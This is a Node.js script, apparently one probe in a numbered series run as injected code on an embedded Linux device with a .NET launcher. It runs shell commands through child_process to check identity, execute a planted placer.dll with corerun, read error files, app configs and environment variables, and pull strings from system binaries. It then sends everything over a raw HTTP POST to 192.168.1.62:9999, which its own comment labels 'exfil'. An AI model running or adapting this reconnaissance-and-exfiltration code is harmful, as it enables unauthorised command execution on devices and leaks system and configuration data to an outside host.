"use strict";

/* p54: dotnet-launcher invocation diagnosis
   1. corerun DIRECT (known invocation) -> does placer.dll run at all?
   2. dotnet error files (/opt/usr/home/owner/share/dotnet_error.*)
   3. dotnet-launcher strings (arg parsing: dll? name? hostfxr? env?)
   4. find a real DN_ app: dir structure + config (canonical launch format)
   5. env vars (DOTNET_*) in module context
   exfil /p54info
*/

var fs = null, cp = null, net = null;
try { fs = require('fs'); } catch (e) {}
try { cp = require('child_process'); } catch (e) {}
try { net = require('net'); } catch (e) {}

var HOST = '192.168.1.62';
var PORT = 9999;
var PLDIR = '/home/owner/share/tmp/sdk_tools';
var CORE = '/usr/share/dotnet/shared/Microsoft.NETCore.App/2.0.0/corerun';
var R = { ts: new Date().toISOString(), probe: 'p54', results: {}, log: [] };
var posted = false;

function L(s) { R.log.push(String(s).substring(0, 500)); }

function postBuf(path, buf) {
  var hdr = 'POST ' + path + ' HTTP/1.1\r\nHost: ' + HOST + ':9999\r\nContent-Type: application/octet-stream\r\nContent-Length: ' + buf.length + '\r\nConnection: close\r\n\r\n';
  try {
    var s = net.connect(PORT, HOST);
    s.setTimeout(90000, function () { s.destroy(); });
    s.on('connect', function () {
      s.write(hdr);
      var off = 0;
      var iv = setInterval(function () {
        if (off >= buf.length) { clearInterval(iv); setTimeout(function () { s.destroy(); }, 3000); return; }
        s.write(buf.slice(off, off + 65536));
        off += 65536;
      }, 50);
      setTimeout(function () { s.destroy(); }, 240000);
    });
    s.on('error', function (e) { L('postBuf err ' + e.message); });
  } catch (e) { L('postBuf ctor ' + e); }
}

function postFinal() {
  if (posted) return;
  posted = true;
  postBuf('/p54info', new Buffer(JSON.stringify(R), 'utf8'));
}

function run(cmd, timeoutMs) {
  try {
    var out = cp.execSync(cmd, { timeout: timeoutMs || 25000, maxBuffer: 16 * 1024 * 1024 }).toString().trim();
    return '[exit 0] ' + out;
  } catch (e) {
    var o = '';
    if (e.stdout) o += e.stdout.toString();
    if (e.stderr) o += (o ? '\n' : '') + e.stderr.toString();
    return '[exit ' + (e.status === undefined ? '?' : e.status) + '] ' + (o || (e && e.message) || 'unknown').substring(0, 8000);
  }
}

function main() {
  R.results.identity = run('id 2>&1', 10000);

  // 1) corerun direct
  R.results.corerun_direct = run(CORE + ' ' + PLDIR + '/placer.dll caps 2>&1; echo cr_exit=$?', 45000);

  // 2) dotnet error files
  R.results.err_files = run('ls -la /opt/usr/home/owner/share/dotnet_error.* 2>&1; echo ===CAT===; cat /opt/usr/home/owner/share/dotnet_error.* 2>&1 | head -60; echo ===LSDIR===; ls -la /opt/usr/home/owner/share/ 2>&1 | head -20', 15000);

  // 3) dotnet-launcher strings
  R.results.dl_strings = run('strings /usr/bin/dotnet-launcher 2>/dev/null | grep -iE "\\.dll|runtimeconfig|deps|\\.json|hostfxr|hostpolicy|coreclr|corerun|DOTNET|usage|error|assembly|app_?name|config|/opt/|/usr/share/dotnet" | head -60', 20000);

  // 4) find a real DN_ app structure
  R.results.dn_apps = run('echo ===APPS_DIR===; ls -la /opt/usr/apps/ 2>&1 | grep -iE "DN_|dotnet|corerun" | head -20; echo ===FIND===; find /opt/usr/apps -maxdepth 2 -iname "*DN_*" 2>/dev/null | head; find /opt -maxdepth 4 -iname "*DN_*" -type d 2>/dev/null | head', 30000);
  R.results.dn_one = run('echo ===FIRST_DN===; d=$(find /opt -maxdepth 4 -iname "DN_*" -type d 2>/dev/null | head -1); echo dir=$d; ls -la "$d" 2>&1; echo ===SUBDIRS===; find "$d" -maxdepth 2 -type f 2>/dev/null | head -30; echo ===CONFIG===; for f in "$d"/config.xml "$d"/*.json "$d"/*.config; do echo "--- $f ---"; cat "$f" 2>&1 | head -30; done', 30000);

  // 5) env vars
  R.results.env = run('env 2>&1 | grep -iE "dotnet|DOTNET|corerun" ; echo ===ENVALL_HEAD===; env 2>&1 | head -30', 15000);

  R.results.final = 'done ' + new Date().toISOString();
  L('done ' + new Date().toISOString());
  postFinal();
  setTimeout(postFinal, 15000);
}

try { main(); } catch (e) { R.results.fatal = String(e) + ' | ' + (e.stack || 'no-stack'); postFinal(); }
